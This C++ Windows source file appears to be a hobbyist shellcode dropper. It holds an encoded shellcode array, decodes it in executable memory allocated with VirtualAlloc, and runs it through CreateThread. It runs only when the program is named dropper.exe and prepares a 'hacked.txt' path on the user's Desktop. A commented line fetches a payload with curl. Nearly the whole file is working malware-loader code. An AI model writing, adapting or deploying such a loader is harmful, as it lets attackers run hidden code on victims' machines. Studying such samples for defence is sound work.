#include <iostream>
#include <string>
#include <Windows.h>
#include <fstream>
#include <Lmcons.h>
using std::string;
using namespace std;

string getFileName(const string& s) {
    char sep = '/';
#ifdef _WIN32
    sep = '\\';
#endif
    size_t i = s.rfind(sep, s.length());
    if (i != string::npos) {
        return(s.substr(i + 1, s.length() - i));
    }
    return("");
}

void dropShit(){
        unsigned char shellcode[] = 
        "\xbb\xae\xdf\x60\x56\xdb\xd7\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
        "\x14\x31\x5a\x14\x83\xea\xfc\x03\x5a\x10\x4c\x2a\x51\x8d\x67"
        "\x36\xc1\x72\xd4\xd3\xe4\xfd\x3b\x93\x8f\x30\x3b\x8f\x11\x99"
        "\x53\x32\xae\x0c\xff\x58\xbe\x7f\xaf\x15\x5f\x15\x29\x7e\x6d"
        "\x6a\x3c\x3f\x69\xd8\x3a\x70\x17\xd3\xc2\x33\x68\x8d\x0f\x33"
        "\x1b\x0b\xe5\x0b\x44\x61\x79\x3a\x0d\x81\x11\x92\xc2\x02\x89"
        "\x84\x33\x87\x20\x3b\xc5\xa4\xe2\x90\x5c\xcb\xb2\x1c\x92\x8c";
        //system('curl http://127.0.0.1/asd.asm -o asd.asm')

        PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
        DWORD threadID;
        for (int i = 0; i < sizeof shellcode; i++)
        {
            ((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) - 13;
        }
        HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
        WaitForSingleObject(hThread, INFINITE);
        for (int i = 0; i < sizeof shellcode; i++)
        {
            ((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) ^ '\x35';
        }
}

// void dropShit(string path) {
//    ofstream MyFile(path);
//    MyFile << "just kidding";
//    MyFile.close();
//   shellCode();
//} 

int main(int argc, char** argv) {
    char fileName[MAX_PATH];
    char username[UNLEN + 1];
    DWORD len = UNLEN + 1;
    GetUserName(username, &len);
    string path = argv[0];

    string newFile;
    string first = "C:\\Users\\";
    string second = "\\Desktop\\hacked.txt";
    
    newFile = first + username + second;

    if (getFileName(path) == "dropper.exe") {
        cout << "DROPPING :))" << endl;
        dropShit();
    }
    else {
        cout << "Fucky Wucky" << endl;
        exit(1);
    }
}
